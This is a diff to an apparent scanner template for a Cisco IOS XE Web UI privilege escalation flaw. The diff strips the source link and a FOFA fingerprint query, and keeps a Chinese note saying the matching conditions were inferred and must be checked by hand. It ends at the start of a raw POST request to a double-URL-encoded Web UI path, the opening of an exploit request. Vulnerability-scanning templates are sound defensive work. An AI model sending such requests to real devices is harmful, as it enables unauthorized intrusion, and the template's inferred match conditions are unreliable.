@@ -3,14 +3,8 @@ info:
   name: Cisco IOS XE Web UI存在权限提升漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/id15vflfbv06amty
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: id15vflfbv06amty
-    fofa: FOFA:body="<script>window.onload=function(){ url ='/webui';window.location.href=url;}</script>"
 http:
 - raw:
   - 'POST /%2577eb%2575i_%2577sma_Http HTTP/1.1
